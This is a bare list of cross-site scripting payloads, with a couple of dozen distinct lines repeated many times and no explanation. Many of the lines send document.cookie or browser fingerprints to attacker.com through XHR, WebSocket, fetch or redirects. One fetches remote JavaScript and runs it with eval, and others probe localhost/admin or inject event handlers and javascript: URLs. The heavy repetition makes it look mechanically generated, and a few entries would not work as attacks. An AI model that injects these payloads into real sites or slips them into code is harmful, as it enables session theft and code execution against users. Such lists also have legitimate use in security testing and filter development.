<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<svg onload="alert(1)"></svg>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<svg onload="alert(1)"></svg>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<div style="background-image: url('javascript:alert(1)')"></div>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<svg onload="alert(1)"></svg>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<input name="location" value="<img src='x' onerror=alert(1)>">
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<div style="background-image: url('javascript:alert(1)')"></div>
<script>if (window.applicationCache) { window.applicationCache.swapCache(); alert(1); }</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<svg onload="alert(1)"></svg>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>fetch('http://attacker.com/malicious.js').then(response => response.text()).then(eval)</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>fetch("http://localhost/admin").then(response => response.text()).then(console.log)</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var observer = new MutationObserver(function(mutations) { mutations.forEach(function(mutation) { if (mutation.type === 'attributes') { eval('alert(1)'); } }); }); observer.observe(document.body, { attributes: true });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<script>chrome.tabs.create({url: 'javascript:alert(1)'})</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<svg onload="alert(1)"></svg>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<script>var fp = new Fingerprint2(); fp.get(function(result) { fetch('http://attacker.com/steal?fingerprint=' + result); });</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>navigator.serviceWorker.register('/sw.js');</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/xss?cookie=' + document.cookie, true); xhr.send();</script>
<script>window.location = 'http://attacker.com?cookie=' + document.cookie;</script>
<script>var pc = new RTCPeerConnection(); var channel = pc.createDataChannel("xss"); channel.onopen = function() { channel.send('alert(1)'); };</script>
<script>var db = openDatabase('xss', '1.0', 'XSS DB', 2 * 1024 * 1024); db.transaction(function (tx) { tx.executeSql('CREATE TABLE IF NOT EXISTS XSS (id unique, text)'); tx.executeSql('INSERT INTO XSS (id, text) VALUES (1, "<img src='x' onerror=alert(1)>")'); });</script>
<img src="x" onerror="fetch('http://attacker.com/exfiltrate?cookie=' + document.cookie)">
<div style="background-image: url('javascript:alert(1)')"></div>
<input name="location" value="<img src='x' onerror=alert(1)>">
<script>let socket = new WebSocket('ws://attacker.com'); socket.onopen = () => socket.send(document.cookie);</script>
<script>var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText('XSS', 10, 10); var fingerprint = canvas.toDataURL(); fetch('http://attacker.com/exfiltrate?fingerprint=' + fingerprint);</script>
<script>var worker = new Worker('data:text/javascript,alert(1);');</script>
<script>Object.prototype.alert = function(){alert('XSS')};alert()</script>
<script src="http://attacker.com/callback?callback=alert(1)"></script>
